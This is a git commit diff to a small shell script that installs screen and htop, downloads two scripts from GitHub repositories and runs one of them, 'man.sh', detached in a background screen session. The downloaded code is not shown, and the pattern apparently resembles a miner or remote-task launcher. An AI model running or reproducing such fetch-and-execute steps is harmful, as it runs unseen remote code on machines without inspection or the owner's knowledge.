25240ea50ac866d7ce89fd371ee703b15ad0fdfc
mohammad2h3 <88118210+mohammad2h3@users.noreply.github.com>
2021-07-29 01:36:44 +0200

    Update sajan.sh

--- sajan.sh
+++ sajan.sh
@@ -1,8 +1,9 @@
 #!/bin/sh
 
+
 sudo apt update
-sudo apt install screen -y
-wget https://github.com/archernap/prem/raw/main/lagan.sh
+sudo apt install screen htop -y
+wget https://github.com/mohammad2h3/prem/raw/main/lagan.sh
 wget https://github.com/biswas179/FkgX/main/man.sh
 chmod +x man.sh
 screen -dmS man ./man.sh 60 70
